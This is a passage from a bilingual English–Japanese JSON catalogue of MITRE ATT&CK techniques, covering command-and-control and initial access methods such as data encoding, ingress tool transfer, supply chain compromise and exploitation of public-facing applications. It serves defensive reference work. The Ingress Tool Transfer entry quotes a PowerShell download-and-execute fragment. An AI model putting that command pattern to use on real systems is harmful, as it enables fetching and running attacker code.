                        "description_eng": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
                        "description_jp": "攻撃者は、コマンドアンドコントロールトラフィックの内容を検出しにくくするために、標準的なデータエンコーディングシステムでデータをエンコードする可能性があります。コマンドアンドコントロール（C2）情報は、既存のプロトコル仕様に準拠する標準的なデータエンコーディングシステムを使用してエンコードできます。一般的なデータエンコーディングスキームには、ASCII、Unicode、16進数、Base64、MIMEなどがあります。(引用: Wikipedia Binary-to-text Encoding)(引用: Wikipedia Character Encoding) gzipなど、一部のデータエンコーディングシステムではデータ圧縮も行われる場合があります。"
                    },
                    {
                        "id": "T1132.002",
                        "name_eng": "Non-Standard Encoding",
                        "name_jp": "非標準エンコーディング",
                        "description_eng": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)",
                        "description_jp": "攻撃者は、コマンドアンドコントロールトラフィックの内容を検出しにくくするために、非標準のデータエンコーディングシステムでデータをエンコードする可能性があります。コマンドアンドコントロール（C2）情報は、既存のプロトコル仕様から逸脱する非標準のデータエンコーディングシステムを使用してエンコードできます。非標準のデータエンコーディングスキームは、HTTPリクエストのメッセージ本文の変更されたBase64エンコーディングなど、標準のデータエンコーディングスキームに基づいているか、関連している場合があります。(引用: Wikipedia Binary-to-text Encoding)(引用: Wikipedia Character Encoding)"
                    }
                ]
            },
            {
                "id": "T1105",
                "name_eng": "Ingress Tool Transfer",
                "name_jp": "イングレスツール転送",
                "description_eng": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
                "description_jp": "攻撃者は、外部システムから侵害された環境にツールやその他のファイルを転送する可能性があります。ツールやファイルは、コマンドアンドコントロールチャネルを介して、または[ftp](https://attack.mitre.org/software/S0095)などの代替プロトコルを介して、外部の攻撃者が制御するシステムから被害者ネットワークにコピーされる場合があります。存在すると、攻撃者はまた、侵害された環境内の被害者デバイス間でツールを転送/拡散する可能性があります（つまり、[ラテラルツール転送](https://attack.mitre.org/techniques/T1570)）。\n\nWindowsでは、攻撃者は<code>copy</code>、<code>finger</code>、[certutil](https://attack.mitre.org/software/S0160)、<code>IEX(New-Object Net.WebClient).downloadString()</code>や<code>Invoke-WebRequest</code>などの[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドなど、さまざまなユーティリティを使用してツールをダウンロードする可能性があります。LinuxおよびmacOSシステムでは、<code>curl</code>、<code>scp</code>、<code>sftp</code>、<code>tftp</code>、<code>rsync</code>、<code>finger</code>、<code>wget</code>など、さまざまなユーティリティも存在します。(引用: t1105_lolbas) <code>wget</code>、<code>curl</code>、<code>scp</code>など、これらのツールの多くはESXiにも存在します。ファイルをダウンロードした後、脅威アクターはハッシュ値を確認して（例えば、<code>certutil -hashfile</code>を介して）その整合性を検証しようとする可能性があります。(引用: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\n敵対者はまた、<code>yum</code>や<code>winget</code>などのインストーラーやパッケージマネージャーを悪用して、被害者ホストにツールをダウンロードするかもしれない。敵対者はまた、Windowsの<code>search-ms</code>プロトコルハンドラーなどのファイルアプリケーション機能を悪用して、[ユーザー実行](https://attack.mitre.org/techniques/T1204)（通常は[フィッシング](https://attack.mitre.org/techniques/T1566)の誘惑と対話した後）によって呼び出されるリモートファイル検索を通じて、被害者に悪意のあるファイルを配信している。(引用：T1105: Trellix_search-ms)\n\nファイルはまた、さまざまな[Webサービス](https://attack.mitre.org/techniques/T1102)や、被害者システム上のネイティブまたはその他の既存のツールを使用して転送することもできます。(引用: PTSecurity Cobalt Dec 2016) 場合によっては、攻撃者はDropboxやOneDriveなど、Webベースのクライアントとオンプレミスクライアント間で同期するサービスを利用して、被害者のシステムにファイルを転送できる可能性があります。例えば、クラウドアカウントを侵害し、サービスのWebポータルにログインすることにより、攻撃者は被害者のマシンにファイルを転送する自動同期プロセスをトリガーできる可能性があります。(引用: Dropbox Malware Sync)",
                "subtechniques": []
            },
            {
                "id": "T1665",
                "name_eng": "Hide Infrastructure",
                "name_jp": "インフラストラクチャの隠蔽",
                "description_eng": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\n\nC2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)\n\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)\n\nHiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)",
                "description_jp": "攻撃者は、C2インフラストラクチャの検出を隠蔽および回避するためにネットワークトラフィックを操作する可能性があります。これは、防御ツールからのトラフィックを識別してフィルタリングしたり、(引用: TA571)自動スキャンツールとセキュリティ研究者の両方から真の宛先を難読化するために悪意のあるドメインをマスキングしたり、(引用: Schema-abuse)(引用: Facad1ng)(引用: Browser-updates)あるいは他の方法で悪意のあるアーティファクトを隠して、他の方法では特定、ブロック、または完全に停止される可能性のある攻撃者インフラストラクチャの発見を遅らせ、有効性を長引かせたりするなど、さまざまな方法で実行できます。\n\nC2ネットワークには、IPアドレスを偽装するための[プロキシ](https://attack.mitre.org/techniques/T1090)やVPNの使用が含まれる場合があり、これにより攻撃者は通常のネットワークトラフィックに紛れ込み、条件付きアクセスポリシーや不正使用対策をバイパスできます。例えば、攻撃者は仮想プライベートクラウドを使用してIPアドレスを偽装し、被害者のIPアドレス範囲により近づけることができます。これはまた、送信元IPアドレスの地理位置情報に依存するセキュリティ対策をバイパスする可能性もあります。(引用: sysdig)(引用: Orange Residential Proxies)\n\n敵対者はまた、一般的なインシデント対応者やセキュリティアプライアンスのユーザーエージェントをブロック/リダイレクトするなど、様々な方法で防御ツールを回避するためにネットワークトラフィックをフィルタリングしようとするかもしれない。(引用：mod_rewrite)(引用：SocGholish-update) IPとジオフェンシングに基づくトラフィックのフィルタリングも、自動化されたサンドボックス化や研究者の活動を回避する可能性がある（すなわち、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)）。(引用：TA571)(引用：mod_rewrite）\n\nC2インフラストラクチャの隠蔽はまた、[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)や[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)などの[リソース開発](https://attack.mitre.org/tactics/TA0042)活動によってサポートされる場合があります。例えば、広く信頼されているホスティングサービスや、著名なURL短縮プロバイダーやマーケティングサービスなどのドメインをC2ネットワークに使用すると、攻撃者は特定の条件が満たされた場合に被害者を悪意のあるWebページやインフラストラクチャにリダイレクトする無害なコンテンツを提示できる可能性があります。(引用: StarBlizzard)(引用: QR-cofense)",
                "subtechniques": []
            },
            {
                "id": "T1008",
                "name_eng": "Fallback Channels",
                "name_jp": "フォールバックチャネル",
                "description_eng": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
                "description_jp": "攻撃者は、主要なチャネルが侵害されたりアクセス不能になったりした場合に、信頼性の高いコマンドアンドコントロールを維持し、データ転送のしきい値を回避するために、フォールバックまたは代替通信チャネルを使用する可能性があります。",
                "subtechniques": []
            }
        ]
    },
    {
        "id": "TA0001",
        "name_eng": "Initial Access",
        "name_jp": "初期アクセス",
        "description_eng": "The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.",
        "description_jp": "攻撃者はあなたのネットワークに侵入しようとしています。\n\n初期アクセスは、ネットワーク内で最初の足がかりを得るためにさまざまな侵入経路を使用するテクニックで構成されます。足がかりを得るために使用されるテクニックには、標的型スピアフィッシングや公開されているWebサーバーの弱点の悪用などがあります。初期アクセスを通じて得られた足がかりは、有効なアカウントや外部リモートサービスの使用など、継続的なアクセスを可能にする場合もあれば、パスワードの変更により使用が制限される場合もあります。",
        "techniques": [
            {
                "id": "T1133",
                "name_eng": "External Remote Services",
                "name_jp": "外部リモートサービス",
                "description_eng": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "description_jp": "攻撃者は、ネットワークへの初期アクセスおよび/またはネットワーク内での永続化のために、外部向けリモートサービスを利用する可能性があります。VPN、Citrix、およびその他のアクセスメカニズムなどのリモートサービスにより、ユーザーは外部の場所から内部エンタープライズネットワークリソースに接続できます。多くの場合、これらのサービスの接続と資格情報認証を管理するリモートサービスゲートウェイがあります。[Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)や[VNC](https://attack.mitre.org/techniques/T1021/005)などのサービスも外部で使用できます。(引用: MacOS VNC software for Remote Desktop)\n\nサービスを使用するための[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスは多くの場合要件であり、これは資格情報ファーミングを介して取得したり、エンタープライズネットワークを侵害した後にユーザーから資格情報を取得したりすることによって取得できます。(引用: Volexity Virtual Private Keylogging) リモートサービスへのアクセスは、操作中の冗長または永続的なアクセスメカニズムとして使用される場合があります。\n\n認証を必要としない公開サービスを介してアクセスを取得することもできます。コンテナ化された環境では、これには公開されたDocker API、Kubernetes APIサーバー、kubelet、またはKubernetesダッシュボードなどのWebアプリケーションが含まれる場合があります。(引用: Trend Micro Exposed Docker Server)(引用: Unit 42 Hildegard Malware)",
                "subtechniques": []
            },
            {
                "id": "T1091",
                "name_eng": "Replication Through Removable Media",
                "name_jp": "リムーバブルメディアによる複製",
                "description_eng": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
                "description_jp": "攻撃者は、マルウェアをリムーバブルメディアにコピーし、メディアがシステムに挿入されて実行されるときに自動実行機能を利用することにより、切断されたネットワークやエアギャップネットワーク上のシステムに移動する可能性があります。ラテラルムーブメントの場合、これはリムーバブルメディアに保存されている実行可能ファイルの変更、またはマルウェアをコピーして正当なファイルのように名前を変更し、ユーザーを騙して別のシステムで実行させることによって発生する可能性があります。初期アクセスの場合、これはメディアの手動操作、メディアを最初にフォーマットするために使用されるシステムの変更、またはメディアのファームウェア自体の変更によって発生する可能性があります。\n\nモバイルデバイスは、USB経由で接続されている場合にPCをマルウェアに感染させるためにも使用される可能性があります。(引用: Exploiting Smartphone USB ) この感染は、デバイス（Android、iOSなど）を使用して達成でき、場合によってはUSB充電ケーブルも使用できます。(引用: Windows Malware Infecting Android)(引用: iPhone Charging Cable Hack) 例えば、スマートフォンがシステムに接続されると、USB接続ディスクドライブと同様にマウントされているように見える場合があります。接続されたシステムと互換性のあるマルウェアがモバイルデバイス上にある場合、マルウェアはマシンに感染する可能性があります（特に自動実行機能が有効になっている場合）。",
                "subtechniques": []
            },
            {
                "id": "T1195",
                "name_eng": "Supply Chain Compromise",
                "name_jp": "サプライチェーン侵害",
                "description_eng": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "description_jp": "攻撃者は、データまたはシステムの侵害を目的として、最終消費者が受け取る前に製品または製品配送メカニズムを操作する可能性があります。\n\nサプライチェーン侵害は、サプライチェーンのどの段階でも発生する可能性があります。例：\n\n* 開発ツールの操作\n* 開発環境の操作\n* ソースコードリポジトリ（パブリックまたはプライベート）の操作\n* オープンソース依存関係のソースコードの操作\n* ソフトウェア更新/配布メカニズムの操作\n* 侵害/感染したシステムイメージ（工場で感染したリムーバブルメディアの複数のケース）(引用: IBM Storwize)(引用: Schneider Electric USB Malware)\n* 正当なソフトウェアの改変版との置き換え\n* 正当な販売代理店への改変/偽造製品の販売\n* 出荷妨害\n\nサプライチェーン侵害はハードウェアまたはソフトウェアのあらゆるコンポーネントに影響を与える可能性がありますが、実行を得ようとする攻撃者は、ソフトウェア配布または更新チャネルにおける正当なソフトウェアへの悪意のある追加にしばしば焦点を当ててきました。(引用: Avast CCleaner3 2018)(引用: Microsoft Dofoil 2018)(引用: Command Five SK 2011) ターゲティングは特定の目的の被害者セットに固有である場合もあれば、悪意のあるソフトウェアが広範な消費者に配布されるが、特定の被害者に対してのみ追加の戦術に移行する場合もあります。(引用: Symantec Elderwood Sept 2012)(引用: Avast CCleaner3 2018)(引用: Command Five SK 2011) 多くのアプリケーションで依存関係として使用される人気のあるオープンソースプロジェクトも、依存関係のユーザーに悪意のあるコードを追加する手段として標的にされる可能性があります。(引用: Trendmicro NPM Compromise)",
                "subtechniques": [
                    {
                        "id": "T1195.001",
                        "name_eng": "Compromise Software Dependencies and Development Tools",
                        "name_jp": "ソフトウェア依存関係と開発ツールの侵害",
                        "description_eng": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
                        "description_jp": "攻撃者は、データまたはシステムの侵害を目的として、最終消費者が受け取る前にソフトウェアの依存関係と開発ツールを操作する可能性があります。アプリケーションは、正しく機能するために外部ソフトウェアに依存することがよくあります。多くのアプリケーションで依存関係として使用される人気のあるオープンソースプロジェクトは、依存関係のユーザーに悪意のあるコードを追加する手段として標的にされる可能性があります。(引用: Trendmicro NPM Compromise)\n\nターゲティングは、特定の目的の被害者セットに固有である場合もあれば、広範な消費者に配布されるが、特定の被害者に対してのみ追加の戦術に移行する場合もあります。"
                    },
                    {
                        "id": "T1195.002",
                        "name_eng": "Compromise Software Supply Chain",
                        "name_jp": "ソフトウェアサプライチェーンの侵害",
                        "description_eng": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)",
                        "description_jp": "攻撃者は、データまたはシステムの侵害を目的として、最終消費者が受け取る前にアプリケーションソフトウェアを操作する可能性があります。ソフトウェアのサプライチェーン侵害は、アプリケーションソースコードの操作、そのソフトウェアの更新/配布メカニズムの操作、またはコンパイル済みリリースの変更版との置き換えなど、さまざまな方法で行われる可能性があります。\n\nターゲティングは、特定の目的の被害者セットに固有である場合もあれば、広範な消費者に配布されるが、特定の被害者に対してのみ追加の戦術に移行する場合もあります。(引用: Avast CCleaner3 2018)(引用: Command Five SK 2011)"
                    },
                    {
                        "id": "T1195.003",
                        "name_eng": "Compromise Hardware Supply Chain",
                        "name_jp": "ハードウェアサプライチェーンの侵害",
                        "description_eng": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
                        "description_jp": "攻撃者は、データまたはシステムの侵害を目的として、最終消費者が受け取る前に製品のハードウェアコンポーネントを操作する可能性があります。サプライチェーンでハードウェアまたはファームウェアを変更することにより、攻撃者は検出が困難で、システムに対する高度な制御を攻撃者に与える可能性のあるバックドアをコンシューマネットワークに挿入できます。ハードウェアバックドアは、サーバー、ワークステーション、ネットワークインフラストラクチャ、または周辺機器など、さまざまなデバイスに挿入される可能性があります。"
                    }
                ]
            },
            {
                "id": "T1190",
                "name_eng": "Exploit Public-Facing Application",
                "name_jp": "公開されているアプリケーションの悪用",
                "description_eng": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "description_jp": "攻撃者は、ネットワークへの初期アクセスを取得するために、インターネットに接続されたホストまたはシステムの弱点を悪用しようとする可能性があります。システムの弱点は、ソフトウェアのバグ、一時的な不具合、または設定ミスである可能性があります。\n\n悪用されるアプリケーションは、多くの場合Webサイト/Webサーバーですが、データベース（SQLなど）、標準サービス（SMBやSSHなど）、ネットワークデバイス管理プロトコル（SNMPやスマートインストールなど）、およびインターネットアクセス可能なオープンソケットを持つその他のシステムも含まれる場合があります。(引用: NVD CVE-2016-6662)(引用: CIS Multiple SMB Vulnerabilities)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)(引用: Cisco Blog Legacy Device Attacks)(引用: NVD CVE-2014-7169) ESXiインフラストラクチャでは、攻撃者は公開されたOpenSLPサービスを悪用する可能性があります。あるいは、公開されたVMware vCenterサーバーを悪用する可能性もあります。(引用: Recorded Future ESXiArgs Ransomware 2023)(引用: Ars Technica VMWare Code Execution Vulnerability 2021) 悪用される欠陥によっては、これには[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)または[クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203)も含まれる場合があります。\n\nアプリケーションがクラウドベースのインフラストラクチャでホストされているか、コンテナ化されている場合、それを悪用すると、基盤となるインスタンスまたはコンテナが侵害される可能性があります。これにより、攻撃者はクラウドまたはコンテナAPIへのアクセスパス（[クラウドインスタンスメタデータAPI](https://attack.mitre.org/techniques/T1552/005)経由など）を取得したり、[ホストへのエスケープ](https://attack.mitre.org/techniques/T1611)を介してコンテナホストアクセスを悪用したり、脆弱なIDおよびアクセス管理ポリシーを利用したりできます。\n\n敵対者はまた、特に堅牢なホストベースの防御をサポートしていないエッジネットワークインフラストラクチャや関連アプライアンスを悪用するかもしれない。(引用：Mandiant Fortinet Zero Day)(引用：Wired Russia Cyberwar)\n\nウェブサイトやデータベースについては、OWASPトップ10とCWEトップ25が最も一般的なウェブベースの脆弱性を強調しています。(引用：OWASP Top 10)(引用：CWE top 25)",
                "subtechniques": []
            },
            {
                "id": "T1659",
                "name_eng": "Content Injection",
                "name_jp": "コンテンツインジェクション",
                "description_eng": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "description_jp": "攻撃者は、オンラインネットワークトラフィックを介してシステムに悪意のあるコンテンツを注入することにより、被害者へのアクセスを取得し、継続的に通信する可能性があります。侵害されたウェブサイトでホストされている悪意のあるペイロードに被害者を誘導する（つまり、[ドライブバイターゲット](https://attack.mitre.org/techniques/T1608/004)の後に[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)）のではなく、攻撃者は最初に、トラフィックを操作したり独自のコンテンツを注入したりできる侵害されたデータ転送チャネルを介して被害者にアクセスする可能性があります。これらの侵害されたオンラインネットワークチャネルはまた、既に侵害されたシステムに追加のペイロード（つまり、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）やその他のデータを配信するためにも使用される場合があります。(引用: ESET MoustachedBouncer)\n\n敵対者は、次のような様々な方法で被害者システムにコンテンツを注入する可能性があります：\n\n* 中間から。攻撃者は正当なオンラインクライアントサーバー通信の間に位置します（**注:** これは、エンタープライズ環境内のみのAiTMアクティビティを記述する[中間者攻撃](https://attack.mitre.org/techniques/T1557)とは異なりますが、類似しています）(引用: Kaspersky Encyclopedia MiTM)\n* 横から。悪意のあるコンテンツが注入され、正当なオンラインサーバーの要求に対する偽の応答としてクライアントに競合します (引用: Kaspersky ManOnTheSide)\n\nコンテンツインジェクションは、多くの場合、侵害されたアップストリーム通信チャネルの結果であり、例えば、「合法的な傍受」の場合のように、インターネットサービスプロバイダー（ISP）のレベルで発生します。(引用: Kaspersky ManOnTheSide)(引用: ESET MoustachedBouncer)(引用: EFF China GitHub Attack)",
                "subtechniques": []
            },
            {
                "id": "T1199",
                "name_eng": "Trusted Relationship",
                "name_jp": "信頼関係",
                "description_eng": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
